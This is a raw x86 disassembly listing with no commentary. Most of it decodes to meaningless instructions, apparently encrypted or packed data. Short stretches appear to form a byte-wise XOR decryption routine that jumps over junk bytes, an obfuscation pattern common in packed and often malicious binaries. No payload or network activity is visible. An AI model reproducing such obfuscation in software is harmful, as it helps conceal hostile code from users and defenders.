  4124b3:	inc    ebp
  4124b4:	cmc    
  4124b5:	loope  0x412440
  4124b7:	cs aaa 
  4124b9:	mov    edx,DWORD PTR [bp-0x2b4f]
  4124be:	or     esp,edx
  4124c0:	or     edx,DWORD PTR [eax]
  4124c2:	call   0xc74d7250
  4124c7:	inc    ebp
  4124c8:	mov    al,ds:0xba699577
  4124cd:	mov    DWORD PTR [ebp-0x5c],ecx
  4124d0:	mov    DWORD PTR [ebp-0x48],0xba69957b
  4124d7:	mov    DWORD PTR [ebp-0x44],ecx
  4124da:	mov    DWORD PTR [ebp-0x38],0xba69957f
  4124e1:	mov    DWORD PTR [ebp-0x34],ecx
  4124e4:	jmp    0x412a6e
  4124e9:	xchg   edi,eax
  4124ea:	(bad)  
  4124eb:	jbe    0x412531
  4124ed:	pop    esi
  4124ee:	adc    al,0x25
  4124f0:	mov    ah,0xc9
  4124f2:	pop    es
  4124f3:	shr    BYTE PTR [eax-0x57f0bc4c],cl
  4124f9:	push   edx
  4124fa:	es push ss
  4124fc:	push   ss
  4124fd:	cmp    eax,0xc1161604
  412502:	push   cs
  412503:	sub    BYTE PTR ds:0x44a26505,dl
  412509:	lea    ecx,[edi+0xe50c111]
  41250f:	and    dh,dl
  412511:	and    DWORD PTR [edx],ebx
  412513:	jle    0x412502
  412515:	mov    al,ds:0x2b276608
  41251a:	adc    eax,DWORD PTR ds:0x8b851468
  412520:	inc    DWORD PTR [edx-0x40]
  412523:	pop    edx
  412524:	push   esp
  412525:	lahf   
  412526:	jp     0x4124ed
  412528:	xchg   ebx,eax
  412529:	cmp    BYTE PTR [esi+0x5685e631],bh
  41252f:	js     0x412589
  412531:	xor    BYTE PTR [edi-0x56],bl
  412534:	or     eax,0x91151cc6
  412539:	and    al,0x62
  41253b:	fadd   DWORD PTR [eax+0x6e31b19e]
  412541:	xchg   ebp,eax
  412542:	inc    eax
  412543:	xchg   edx,eax
  412544:	adc    esi,DWORD PTR [esi+0x67]
  412547:	rol    BYTE PTR [edi],0x67
  41254a:	or     al,BYTE PTR ds:0xbabf8028
  412550:	scas   eax,DWORD PTR es:[edi]
  412551:	imul   ch
  412553:	xchg   esp,eax
  412554:	(bad)  
  412556:	stos   DWORD PTR es:[edi],eax
  412557:	test   eax,0x5869115d
  41255c:	icebp  
  41255d:	push   eax
  41255e:	adc    al,0xb9
  412560:	adc    al,0xdf
  412562:	and    BYTE PTR [ecx-0x25],al
  412565:	outs   dx,BYTE PTR ds:[esi]
  412566:	mov    esi,0xac1f0aa7
  41256b:	push   esi
  41256c:	out    0xab,al
  41256e:	movzx  edx,si
  412571:	dec    ebp
  412572:	mov    esp,0xca0822c6
  412577:	cmp    al,0x8a
  412579:	out    0x3c,al
  41257b:	push   0xb3470d49
  412580:	sete   BYTE PTR [eax+0x618a8417]
  412587:	and    al,BYTE PTR [ebx]
  412589:	retf   0x1c31
  41258c:	add    al,0x6a
  41258e:	adc    DWORD PTR [edx+0x6e7b9fd6],edi
  412594:	das    
  412595:	xchg   BYTE PTR [esi-0x3bd4d341],ch
  41259b:	pop    eax
  41259c:	shl    cl,cl
  41259e:	les    edx,FWORD PTR [edi-0x7121bc27]
  4125a4:	pop    ebx
  4125a5:	shl    BYTE PTR [edi+eax*4],1
  4125a8:	push   edx
  4125a9:	fwait
  4125aa:	mov    DWORD PTR [edx-0x14],esi
  4125ad:	(bad)  
  4125ae:	mov    BYTE PTR [ebp-0x6f308d4b],ah
  4125b4:	lea    ebp,[ecx+0x3ef1c4ea]
  4125ba:	(bad)  
  4125bb:	loopne 0x412589
  4125bd:	dec    ebx
  4125be:	jp     0x4125ec
  4125c0:	lea    esp,[ebp-0x2b84875b]
  4125c6:	pop    eax
  4125c7:	rcr    BYTE PTR [ebx-0x714026f5],cl
  4125cd:	add    al,0x44
  4125cf:	xchg   esi,eax
  4125d0:	jo     0x412619
  4125d2:	les    edi,FWORD PTR [ecx+ebp*1+0x6c78a5fa]
  4125d9:	or     BYTE PTR [ebp-0x2a858aa0],dh
  4125df:	jp     0x41264c
  4125e1:	stos   BYTE PTR es:[edi],al
  4125e2:	inc    edx
  4125e3:	daa    
  4125e4:	inc    edx
  4125e5:	aaa    
  4125e6:	xor    eax,0x1ab5a320
  4125eb:	pop    ss
  4125ec:	and    DWORD PTR [ecx+0x72],edi
  4125ef:	outs   dx,DWORD PTR ds:[esi]
  4125f0:	out    0xe8,eax
  4125f2:	inc    edi
  4125f3:	cmova  ebx,esp
  4125f6:	mov    esi,0xafa166af
  4125fb:	add    ebx,DWORD PTR [edi-0x47]
  4125fe:	push   es
  4125ff:	fist   DWORD PTR [ebp-0x1bdda4e7]
  412605:	imul   esi,DWORD PTR [ecx-0x36],0x30
  412609:	sub    al,0xa3
  41260b:	inc    ebx
  41260c:	dec    ecx
  41260d:	shl    DWORD PTR [edx-0x68258b5b],1
  412613:	xchg   ebx,eax
  412614:	pusha  
  412615:	mov    bh,0x5e
  412617:	and    ecx,edi
  412619:	aas    
  41261a:	xchg   ebx,eax
  41261b:	clc    
  41261c:	push   ecx
  41261d:	int    0xdd
  41261f:	(bad)
  412622:	cmp    cl,BYTE PTR [edx-0x5593c2b7]
  412628:	lds    esi,FWORD PTR [eax-0x2f25345c]
  41262e:	into   
  41262f:	dec    esi
  412630:	cmp    eax,DWORD PTR [ecx]
  412632:	ins    DWORD PTR es:[edi],dx
  412633:	mov    eax,0x3e7ebdf9
  412638:	cs mov ch,0xb9
  41263b:	(bad)  
  41263c:	enter  0xaa45,0xa8
  412640:	adc    BYTE PTR [edx+ebp*8+0x58a1fec3],0x92
  412648:	addr16 ret 0xcc5
  41264c:	xchg   esi,eax
  41264d:	lock pop ebp
  41264f:	cdq    
  412650:	fsub   QWORD PTR [edi-0xcdf5623]
  412656:	jae    0x412615
  412658:	clc    
  412659:	xchg   ebp,eax
  41265a:	xchg   ecx,eax
  41265b:	test   eax,0xd154f08d
  412660:	(bad)  
  412661:	jmp    0xdf74:0xe63a8ce2
  412668:	into   
  412669:	scas   al,BYTE PTR es:[edi]
  41266a:	push   ds
  41266b:	int    0x86
  41266d:	jns    0x889f861c
  412673:	xchg   edi,eax
  412674:	pop    eax
  412675:	fwait
  412676:	cmp    al,ah
  412678:	ror    DWORD PTR [edi+edi*4],0x99
  41267c:	leave  
  41267d:	fsubr  QWORD PTR [edx+0x43f4cc03]
  412683:	or     BYTE PTR [edx+0x4a],cl
  412686:	inc    ebp
  412687:	mov    al,0xd9
  412689:	loopne 0x412699
  41268b:	and    DWORD PTR [ebp+0x38f48dc5],edx
  412691:	loopne 0x4126e2
  412693:	fwait
  412694:	mov    gs,edi
  412696:	push   ebp
  412697:	dec    edi
  412698:	shr    DWORD PTR [ebx-0x286264be],cl
  41269e:	aam    0xe6
  4126a0:	dec    ecx
  4126a1:	pushf  
  4126a2:	mov    ch,0xfd
  4126a4:	pop    ebx
  4126a5:	clc    
  4126a6:	pop    es
  4126a7:	sar    bh,1
  4126a9:	call   0xe962:0x94852553
  4126b0:	test   DWORD PTR [ecx-0x27093e8e],esi
  4126b6:	or     edi,edi
  4126b8:	xchg   ecx,ebp
  4126ba:	int    0xa
  4126bc:	imul   esi,DWORD PTR [esi],0x27cd6483
  4126c2:	add    al,0x7f
  4126c4:	inc    esi
  4126c5:	out    0xa0,eax
  4126c7:	xchg   esi,eax
  4126c8:	mov    dl,0xe3
  4126ca:	mov    esp,0xe5e2c40
  4126cf:	adc    eax,0xe73ff97
  4126d4:	mov    ecx,0xb22f834e
  4126d9:	pop    ds
  4126da:	adc    esp,edx
  4126dc:	sub    al,0x50
  4126de:	in     eax,dx
  4126df:	fistp  WORD PTR [ebp*2+0x5c6cadeb]
  4126e6:	dec    ebx
  4126e7:	and    al,BYTE PTR [edi-0x5f]
  4126ea:	xor    eax,0xa149a5f9
  4126ef:	jl     0x41268a
  4126f1:	arpl   bx,si
  4126f3:	adc    al,0x9b
  4126f5:	jmp    edi
  4126f7:	mov    dl,0x6
  4126f9:	ret    0x3efb
  4126fc:	js     0x412731
  4126fe:	dec    esp
  4126ff:	and    al,0xa
  412701:	xchg   ebp,eax
  412702:	sub    BYTE PTR [ebp-0x40],ch
  412705:	xchg   BYTE PTR [edi+0x65],bl
  412708:	pop    es
  412709:	fwait
  41270a:	mov    ah,0xfb
  41270c:	clc    
  41270d:	cld    
  41270e:	ror    DWORD PTR [edi+0x60a034ec],cl
  412714:	cmc    
  412715:	js     0x412704
  412717:	cmp    edi,DWORD PTR [esi-0xc]
  41271a:	sub    eax,0x354b1ced
  41271f:	sbb    esi,DWORD PTR ds:0x3d2518e4
  412725:	and    bh,al
  412727:	mov    ebp,0xfec586a4
  41272c:	ss cdq 
  41272e:	scas   al,BYTE PTR es:[edi]
  41272f:	cli    
  412730:	push   eax
  412731:	push   edx
  412732:	ins    DWORD PTR es:[edi],dx
  412733:	fwait
  412734:	dec    edx
  412735:	xchg   ecx,eax
  412736:	and    BYTE PTR [ecx],0xb6
  412739:	scas   eax,DWORD PTR es:[edi]
  41273a:	jo     0x41276d
  41273c:	call   0xabdc9bed
  412741:	(bad)  [edx+0x1aaaed85]
  412747:	outs   dx,BYTE PTR ds:[esi]
  412748:	lods   eax,DWORD PTR ds:[esi]
  412749:	ds sbb eax,0x837c7e73
  41274f:	pop    edx
  412750:	push   ecx
  412751:	call   0xad50e3a5
  412756:	fstp   TBYTE PTR [ecx+0x49]
  412759:	push   eax
  41275a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41275b:	cld    
  41275c:	(bad)  
  41275d:	std    
  41275e:	add    esi,DWORD PTR [edx+edx*2+0x32]
  412762:	inc    eax
  412763:	xlat   BYTE PTR ds:[ebx]
  412764:	add    BYTE PTR [ebp-0x7c],cl
  412767:	cmp    eax,0x8c9280ea
  41276c:	out    dx,eax
  41276d:	sbb    eax,0x12acecb7
  412772:	loop   0x4126ff
  412774:	jmp    0x559b:0x9b072dd6
  41277b:	(bad)  
  41277c:	daa    
  41277d:	push   eax
  41277e:	sbb    al,0x48
  412780:	fisub  DWORD PTR [eax+0x28]
  412783:	imul   esp,DWORD PTR [ecx],0x66
  412786:	pusha  
  412787:	fist   WORD PTR [edi]
  412789:	ds ret 
  41278b:	mov    ebp,0x539ccec0
  412790:	xchg   edi,eax
  412791:	nop
  412792:	ins    BYTE PTR es:[edi],dx
  412793:	xor    DWORD PTR [edi-0x78],edx
  412796:	push   ebx
  412797:	scas   eax,DWORD PTR es:[edi]
  412798:	aaa    
  412799:	call   0x7c3f:0xf2283597
  4127a0:	popa   
  4127a1:	push   ebx
  4127a2:	pop    ss
  4127a3:	mov    edx,cs
  4127a5:	lahf   
  4127a6:	mov    eax,ds:0x6f775ca7
  4127ab:	and    BYTE PTR [edi],ah
  4127ad:	mov    cs,WORD PTR [ecx-0x71466b63]
  4127b3:	inc    edx
  4127b4:	xchg   ecx,eax
  4127b5:	push   cs
  4127b6:	push   cs
  4127b7:	lods   eax,DWORD PTR ds:[esi]
  4127b8:	xchg   ebx,eax
  4127b9:	loope  0x412800
  4127bb:	sbb    edi,ecx
  4127bd:	outs   dx,DWORD PTR ds:[esi]
  4127be:	jo     0x4127a7
  4127c0:	jmp    0x41278c
  4127c2:	loopne 0x4127f2
  4127c4:	sbb    ecx,DWORD PTR [ecx+0x47490abc]
  4127ca:	popf   
  4127cb:	pop    ebx
  4127cc:	sbb    BYTE PTR [eax+0x50],bh
  4127cf:	mov    ch,0xad
  4127d1:	push   esp
  4127d2:	repnz mov ch,0x32
  4127d5:	push   esi
  4127d6:	out    0x38,al
  4127d8:	shl    BYTE PTR [edi],0x16
  4127db:	loop   0x4127ff
  4127dd:	faddp  st(7),st
  4127df:	add    BYTE PTR [edx],al
  4127e1:	data16 and al,0xde
  4127e4:	fisub  WORD PTR [ebx+ebp*4]
  4127e7:	push   esi
  4127e8:	or     BYTE PTR [ecx+0x5a69f846],ah
  4127ee:	lods   eax,DWORD PTR ds:[esi]
  4127ef:	inc    esi
  4127f0:	push   ss
  4127f1:	enter  0x93e,0xc3
  4127f5:	adc    eax,0xadc039c
  4127fa:	jo     0x41283f
  4127fc:	les    ebp,FWORD PTR [eax-0x569f6684]
  412802:	jecxz  0x412834
  412804:	dec    ebx
  412805:	scas   eax,DWORD PTR es:[edi]
  412806:	ins    BYTE PTR es:[edi],dx
  412807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412808:	shr    eax,cl
  41280a:	out    0x25,al
  41280c:	mov    DWORD PTR [ecx],edi
  41280e:	loop   0x412824
  412810:	lds    edx,FWORD PTR [eax]
  412812:	lock push eax
  412814:	mov    eax,0x7efb47d8
  412819:	sub    BYTE PTR ds:0x184c43e0,dl
  41281f:	and    bl,ah
  412821:	or     eax,0x360bb9a6
  412826:	xchg   ecx,eax
  412827:	mov    ch,0x2c
  412829:	jo     0x4127e7
  41282b:	xor    esi,ebp
  41282d:	fs pushf 
  41282f:	inc    esi
  412830:	jmp    0x4127ba
  412832:	sub    al,0x96
  412834:	cmc    
  412835:	sahf   
  412836:	jo     0x412860
  412838:	dec    ebx
  412839:	sub    ebx,DWORD PTR gs:[esp+ebp*2]
  41283d:	inc    ecx
  41283e:	inc    esp
  41283f:	mov    esi,0x6e4bb23f
  412844:	xlat   BYTE PTR ds:[ebx]
  412845:	test   al,0x13
  412847:	mov    edx,0xfd1d884
  41284c:	(bad)  
  41284d:	fisubr DWORD PTR [edx+ebx*4-0x7c9c518c]
  412854:	aaa    
  412855:	mov    ah,BYTE PTR [ecx+0x65dd6566]
  41285b:	arpl   bx,di
  41285d:	mov    eax,0x1d6711fa
  412862:	jno    0x412884
  412864:	std    
  412865:	inc    ecx
  412866:	xchg   BYTE PTR [edi+0x659df8f],dh
  41286c:	xor    DWORD PTR [edi+eax*2],esp
  41286f:	push   ds
  412870:	lock ins BYTE PTR es:[edi],dx
  412872:	in     eax,dx
  412873:	inc    eax
  412874:	call   0x52da:0xe7d4ab2c
  41287b:	and    DWORD PTR [ebx],eax
  41287d:	pop    es
  41287e:	dec    ch
  412880:	aad    0x75
  412882:	(bad)  
  412884:	dec    eax
  412885:	pop    edx
  412886:	sub    al,0x4f
  412888:	adc    dh,ah
  41288a:	jb     0x412881
  41288c:	dec    ebp
  41288d:	aam    0xd
  41288f:	mov    esi,0xf1663162
  412894:	push   esp
  412895:	enter  0xd9f8,0xca
  412899:	jns    0x412845
  41289b:	fild   WORD PTR [eax+ecx*8+0x2683f317]
  4128a2:	xchg   esp,eax
  4128a3:	push   esi
  4128a4:	sahf   
  4128a5:	int3   
  4128a6:	in     eax,dx
  4128a7:	cdq    
  4128a8:	inc    eax
  4128a9:	inc    esi
  4128aa:	aad    0xf4
  4128ac:	pop    eax
  4128ad:	adc    esi,DWORD PTR [esi+0x1468980e]
  4128b3:	jg     0x41291c
  4128b5:	xchg   esp,eax
  4128b6:	imul   edx,DWORD PTR [eax+0x725c67ec],0xdcc02dde
  4128c0:	and    al,0x55
  4128c2:	jo     0x4128e9
  4128c4:	das    
  4128c5:	ret    0x8f11
  4128c8:	adc    cl,al
  4128ca:	adc    DWORD PTR [eax-0x51],ecx
  4128cd:	fcom   QWORD PTR [ebx-0x40bfd945]
  4128d3:	cs ins BYTE PTR es:[edi],dx
  4128d5:	test   DWORD PTR [edi+ebp*1],0xb726b2b5
  4128dc:	cld    
  4128dd:	imul   ebp,DWORD PTR [ecx+0x54],0xe4871ad1
  4128e4:	lods   al,BYTE PTR ds:[esi]
  4128e5:	retf   
  4128e6:	ss pushf 
  4128e8:	aaa    
  4128e9:	ds push edx
  4128eb:	les    edx,FWORD PTR [edi]
  4128ed:	push   edi
  4128ee:	inc    ecx
  4128ef:	and    DWORD PTR ds:0x3792cf4d,0x16
  4128f6:	xor    bh,BYTE PTR [edx-0x4f]
  4128f9:	push   ebx
  4128fa:	(bad)  
  4128fb:	jge    0x412901
  4128fd:	xor    al,0xf7
  4128ff:	xchg   ebx,eax
  412900:	jns    0x4128bc
  412902:	(bad)  [esi]
  412904:	ins    DWORD PTR es:[edi],dx
  412905:	jp     0x4128ac
  412907:	add    eax,0x4ce089d8
  41290c:	je     0x4128bf
  41290e:	push   edi
  41290f:	gs cwde 
  412911:	mov    bl,0xf
  412913:	cwde   
  412914:	jp     0x412991
  412916:	adc    al,0xbc
  412918:	push   ebp
  412919:	ins    BYTE PTR es:[edi],dx
  41291a:	out    0xb1,eax
  41291c:	mov    eax,ds
  41291e:	adc    dl,BYTE PTR [edi-0x4a4228e5]
  412924:	xchg   ebp,eax
  412925:	mov    edi,0x632a00b8
  41292a:	pop    ecx
  41292b:	lea    ecx,[esi+0x4cd743f9]
  412931:	push   esi
  412932:	pop    ss
  412933:	mov    ebp,?
  412935:	fsubr  DWORD PTR [ecx]
  412937:	lds    esi,FWORD PTR [edi-0x2f127e25]
  41293d:	or     DWORD PTR [edx],edi
  41293f:	dec    edx
  412940:	pushf  
  412941:	add    dh,ah
  412943:	adc    DWORD PTR ds:0xc9be36a2,esp
  412949:	or     esi,DWORD PTR [ecx+0x7346ca0f]
  41294f:	dec    ebx
  412950:	div    BYTE PTR [edx-0x3620aef0]
  412956:	xchg   ecx,eax
  412957:	jg     0x762c00d4
  41295d:	inc    ecx
  41295e:	loope  0x4129bc
  412960:	mov    al,ds:0x11c54a03
  412965:	repz into 
  412967:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412968:	xchg   esi,eax
  412969:	lds    ebx,FWORD PTR [esi+0x6eee084a]
  41296f:	dec    edx
  412970:	sbb    DWORD PTR [esi+eax*2-0x2cf2d367],ebx
  412977:	mov    eax,ds:0x91a7c206
  41297c:	xchg   edx,eax
  41297d:	adc    al,0x8c
  41297f:	jne    0x4129cb
  412981:	jae    0x412952
  412983:	outs   dx,DWORD PTR ds:[esi]
  412984:	lds    edi,FWORD PTR [edi]
  412986:	jno    0x41299b
  412988:	sar    DWORD PTR [edx+0x6268da7d],0xa3
  41298f:	mov    WORD PTR [esi],fs
  412991:	inc    BYTE PTR [edx]
  412993:	lds    esp,FWORD PTR [esi+0x2c95f2f9]
  412999:	jno    0x4129b9
  41299b:	xchg   BYTE PTR [eax+ebp*2-0x189ade30],al
  4129a2:	pop    esp
  4129a3:	(bad)  
  4129a4:	nop
  4129a5:	mov    ss,WORD PTR [eax]
  4129a7:	out    dx,al
  4129a8:	mov    WORD PTR [edx],fs
  4129aa:	push   ebp
  4129ab:	mov    edi,0x37a62116
  4129b0:	fwait
  4129b1:	ins    BYTE PTR es:[edi],dx
  4129b2:	mov    ah,0x11
  4129b4:	pop    esi
  4129b5:	inc    esi
  4129b6:	(bad)  
  4129b7:	cmp    BYTE PTR [ebx+eax*1-0x2b],bh
  4129bb:	xor    al,0x32
  4129bd:	adc    DWORD PTR [ecx+0x2f14f6ef],0xa6a0b76b
  4129c7:	xor    eax,0xed1ba1ef
  4129cc:	push   esi
  4129cd:	cli    
  4129ce:	mov    DWORD PTR [esi-0x7f],esi
  4129d1:	pop    esp
  4129d2:	scas   al,BYTE PTR es:[edi]
  4129d3:	adc    eax,0xe9660cca
  4129d8:	ins    BYTE PTR es:[edi],dx
  4129d9:	in     al,0x72
  4129db:	aad    0xe7
  4129dd:	or     BYTE PTR [edx],ch
  4129df:	add    ch,BYTE PTR [esi]
  4129e1:	outs   dx,DWORD PTR ds:[esi]
  4129e2:	bound  edi,QWORD PTR [ebx-0x3b4b433d]
  4129e8:	ret    0x1f9e
  4129eb:	lock cmp eax,0xd3b63272
  4129f1:	inc    eax
  4129f2:	call   0xd4a:0xeaf5bc00
  4129f9:	xchg   esi,eax
  4129fa:	xchg   ecx,eax
  4129fb:	xor    esi,DWORD PTR [edi-0x78]
  4129fe:	push   edi
  4129ff:	xchg   ecx,eax
  412a00:	dec    edx
  412a01:	in     al,0xa0
  412a03:	or     DWORD PTR [esi],0x72afa0ae
  412a09:	sbb    al,0xf2
  412a0b:	loop   0x4129d6
  412a0d:	mov    ebx,DWORD PTR [ecx+esi*8]
  412a10:	and    al,bh
  412a12:	pop    eax
  412a13:	les    eax,FWORD PTR [edx+0x41]
  412a16:	jmp    0x72da891a
  412a1b:	push   ecx
  412a1c:	outs   dx,DWORD PTR ds:[esi]
  412a1d:	ret    0xc5b5
  412a20:	xor    cl,ch
  412a22:	dec    ebp
  412a23:	or     BYTE PTR [ebp+esi*1+0x6b],bl
  412a27:	inc    ecx
  412a28:	mov    cs,WORD PTR [esi+edx*1]
  412a2b:	lahf   
  412a2c:	xor    eax,0x73fbdb2a
  412a31:	adc    edi,eax
  412a33:	lea    edi,[ecx-0x2cbd1913]
  412a39:	mov    dl,ch
  412a3b:	shr    BYTE PTR [ebx],0x1f
  412a3e:	add    eax,0xe241494a
  412a43:	and    al,0xe0
  412a45:	add    al,0x37
  412a47:	outs   dx,BYTE PTR ds:[esi]
  412a48:	sahf   
  412a49:	call   0x8703a87c
  412a4e:	lods   al,BYTE PTR ds:[esi]
  412a4f:	int3   
  412a50:	aas    
  412a51:	mov    ch,BYTE PTR [ebx-0x41]
  412a54:	loope  0x412a4b
  412a56:	xor    eax,0xcafb7e9d
  412a5b:	mov    dl,0x85
  412a5d:	ret    
  412a5e:	(bad)  
  412a5f:	out    0x92,al
  412a61:	jb     0x412ac7
  412a63:	(bad)  
  412a64:	aaa    
  412a65:	jle    0x412ac4
  412a67:	pop    ss
  412a68:	cmp    al,0x45
  412a6a:	and    dl,BYTE PTR [ebx+0x12]
  412a6d:	jnp    0x4dcc32b8
  412a73:	or     al,0xf
  412a75:	lods   al,BYTE PTR ds:[esi]
  412a76:	enter  0xc102,0xe9
  412a7a:	add    cl,BYTE PTR [ebx+0x558b084d]
  412a80:	or     al,0x33
  412a82:	mov    ecx,0xd2331ee1
  412a88:	or     eax,edx
  412a8a:	add    eax,DWORD PTR ds:0x422298
  412a90:	mov    DWORD PTR [ebp+0x14],eax
  412a93:	mov    eax,DWORD PTR [ebp+0x8]
  412a96:	mov    ecx,DWORD PTR [ebp+0xc]
  412a99:	shrd   eax,ecx,0x2
  412a9d:	shr    ecx,0x2
  412aa0:	mov    ecx,DWORD PTR [ebp+0x8]
  412aa3:	mov    edx,DWORD PTR [ebp+0xc]
  412aa6:	xor    eax,edi
  412aa8:	shl    ecx,0x1e
  412aab:	xor    edx,edx
  412aad:	or     eax,edx
  412aaf:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  412ab3:	mov    eax,DWORD PTR [ebp+0x14]
  412ab6:	xor    BYTE PTR [eax],cl
  412ab8:	mov    eax,DWORD PTR [ebp-0x60]
  412abb:	mov    ecx,DWORD PTR [ebp-0x5c]
  412abe:	shrd   eax,ecx,0x2
  412ac2:	shr    ecx,0x2
  412ac5:	mov    ecx,DWORD PTR [ebp-0x60]
  412ac8:	mov    edx,DWORD PTR [ebp-0x5c]
  412acb:	xor    eax,edi
  412acd:	shl    ecx,0x1e
  412ad0:	xor    edx,edx
  412ad2:	or     eax,edx
  412ad4:	add    eax,DWORD PTR ds:0x422298
  412ada:	mov    DWORD PTR [ebp+0x14],eax
  412add:	mov    eax,DWORD PTR [ebp-0x60]
  412ae0:	mov    ecx,DWORD PTR [ebp-0x5c]
  412ae3:	shrd   eax,ecx,0x2
  412ae7:	shr    ecx,0x2
  412aea:	mov    ecx,DWORD PTR [ebp-0x60]
  412aed:	mov    edx,DWORD PTR [ebp-0x5c]
  412af0:	jmp    0x41307a
  412af5:	xchg   ebx,eax
  412af6:	retf   
  412af7:	cs (bad) 
  412af9:	push   ds
  412afa:	adc    dl,BYTE PTR [edx]
  412afc:	mov    ds:0x683e5c87,eax
  412b01:	push   0x896eca8e
  412b06:	adc    dl,BYTE PTR [esi]
  412b08:	push   ss
  412b09:	cmp    eax,0x8a161604
  412b0e:	cmc    
  412b0f:	xor    eax,0xaa911a2c
  412b14:	push   0xffffffc4
  412b16:	fidiv  WORD PTR [edx-0x31]
  412b19:	sbb    eax,0x4af66e73
  412b1e:	mov    ds:0x70da3671,eax
  412b23:	ins    BYTE PTR es:[edi],dx
  412b24:	jno    0x412b1e
  412b26:	mov    ch,0x7a
  412b28:	push   edx
  412b29:	xor    bh,BYTE PTR [eax+0x43df0811]
  412b2f:	mov    edx,0x89c4edc1
  412b34:	pop    ebx
  412b35:	dec    esp
  412b36:	mov    ch,dh
  412b38:	ja     0x412b2d
  412b3a:	(bad)  
  412b3b:	cmp    al,0xd0
  412b3d:	cmp    edi,DWORD PTR [edi+0x5008c2a5]
  412b43:	mov    ch,0x22
  412b45:	jge    0x412b54
  412b47:	or     al,0x55
  412b49:	xlat   BYTE PTR ds:[ebx]
  412b4a:	movzx  edi,WORD PTR [ebp+edx*2-0x1eedbfb7]
  412b52:	dec    edx
  412b53:	jo     0x412b9c
  412b55:	idiv   BYTE PTR [edx-0x3c]
  412b58:	dec    ebp
  412b59:	and    ebx,edx
  412b5b:	xor    BYTE PTR [ebp+0x3dd444bd],cl
  412b61:	lods   eax,DWORD PTR ds:[esi]
  412b62:	loop   0x412af5
  412b64:	add    ebx,ecx
  412b66:	xchg   ecx,eax
  412b67:	sti    
  412b68:	int3   
  412b69:	fadd   QWORD PTR [esi]
  412b6b:	or     eax,0xe819076c
  412b70:	push   edx
  412b71:	inc    eax
  412b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b73:	sbb    eax,0x9e0921f8
  412b78:	sbb    dh,ch
  412b7a:	fadd   QWORD PTR [ecx-0x72]
  412b7d:	xchg   esi,eax
  412b7e:	test   eax,0x7ae5d433
  412b83:	cs je  0x412b8a
  412b86:	adc    eax,0x8dd11fae
  412b8b:	dec    ebx
  412b8c:	out    0xb7,al
  412b8e:	cli    
  412b8f:	sbb    ah,BYTE PTR [eax-0x37]
  412b92:	outs   dx,DWORD PTR ds:[esi]
  412b93:	pop    es
  412b94:	push   edi
  412b95:	push   esi
  412b96:	ror    DWORD PTR [ecx-0x64],0xab
  412b9a:	mov    ecx,0xa83ae48
  412b9f:	dec    ecx
  412ba0:	push   esp
  412ba1:	xor    edx,esi
  412ba3:	push   ebx
  412ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ba5:	ss popa 
  412ba7:	jbe    0x412b47
  412ba9:	push   ebp
  412baa:	in     al,dx
  412bab:	pop    esi
  412bac:	(bad)  es:[edi+0x736675e8]
  412bb3:	mov    eax,ds:0xeec36960
  412bb8:	xor    ah,ch
  412bba:	and    dl,BYTE PTR [edx]
  412bbc:	xor    dl,bl
  412bbe:	xor    BYTE PTR [eax+0x7b],0xaa
  412bc2:	push   ebp
  412bc3:	mov    bh,0x47
  412bc5:	jecxz  0x412c0c
  412bc7:	imul   esi,ebp,0xffffff91
  412bca:	loope  0x412bd4
  412bcc:	xchg   ebp,eax
  412bcd:	dec    ebx
  412bce:	stos   DWORD PTR es:[edi],eax
  412bcf:	ficom  DWORD PTR [ecx-0x18]
  412bd2:	ja     0x412b56
  412bd4:	sbb    eax,0xf0470cd9
  412bd9:	cld    
  412bda:	pop    esi
  412bdb:	jno    0x412ba3
  412bdd:	in     al,dx
  412bde:	test   eax,0xc3e384fe
  412be3:	out    0x62,al
  412be5:	or     edx,eax
  412be7:	mov    bh,0xb2
  412be9:	fwait
  412bea:	into   
  412beb:	inc    edi
  412bec:	dec    eax
  412bed:	(bad)  
  412bef:	pushf  
  412bf0:	dec    ecx
  412bf1:	pop    edi
  412bf2:	daa    
  412bf3:	push   edx
  412bf4:	or     BYTE PTR [edx+0x4c],0x2d
  412bf8:	mov    edx,0x33c34480
  412bfd:	add    esi,ebx
  412bff:	push   es
  412c00:	push   eax
  412c01:	jle    0x412bf5
  412c03:	cwde   
  412c04:	dec    esi
  412c05:	fidivr WORD PTR [ebx]
  412c07:	sub    bh,0x8e
  412c0a:	daa    
  412c0b:	sub    DWORD PTR [esi-0x7a],ebx
  412c0e:	or     esp,DWORD PTR [edx]
  412c10:	ror    DWORD PTR [esi],1
  412c12:	jg     0x412c3a
  412c14:	and    eax,0xb2294dcb
  412c19:	ror    DWORD PTR [eax],cl
  412c1b:	mov    ?,WORD PTR [edx-0x6c260618]
  412c21:	dec    ebp
  412c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c23:	xor    al,0xd0
  412c25:	fcomp  QWORD PTR [ecx]
  412c27:	call   0xbcce:0x3a460fa9
  412c2e:	cmp    BYTE PTR [esi+ebp*8-0x56],ah
  412c32:	jns    0x412bd6
  412c34:	push   esp
  412c35:	push   es
  412c36:	mov    al,0x53
  412c38:	mov    ah,0x81
  412c3a:	dec    esp
  412c3b:	dec    edi
  412c3c:	imul   ebx,DWORD PTR [edx+edx*8+0x34a6759e],0xf9b42be2
  412c47:	retw   
  412c49:	arpl   WORD PTR [edx],dx
  412c4b:	bound  esp,QWORD PTR [ebp+0x74]
  412c4e:	pushf  
  412c4f:	push   edx
  412c50:	in     eax,0x8e
  412c52:	mov    al,ds:0x499401a5
  412c57:	je     0x412ca1
  412c59:	lods   eax,DWORD PTR ds:[esi]
  412c5a:	pusha  
  412c5b:	lea    eax,[esi+0xeb8f5ec]
  412c61:	jmp    0x412c2f
  412c63:	xchg   ebp,eax
  412c64:	pop    ecx
  412c65:	dec    edx
  412c66:	adc    eax,0xd20b5ab6
  412c6b:	sbb    DWORD PTR [ebx+0x6c],eax
  412c6e:	mov    dh,0xe3
  412c70:	push   edx
  412c71:	or     dh,cl
  412c73:	xchg   edi,eax
  412c74:	repnz or al,0x61
  412c77:	lods   al,BYTE PTR ds:[esi]
  412c78:	cmp    eax,0xe633514a
  412c7d:	sub    ah,bh
  412c7f:	fsubr  QWORD PTR [ebx-0x35]
  412c82:	aad    0x7
  412c84:	test   BYTE PTR [edx],bl
  412c86:	xchg   ecx,eax
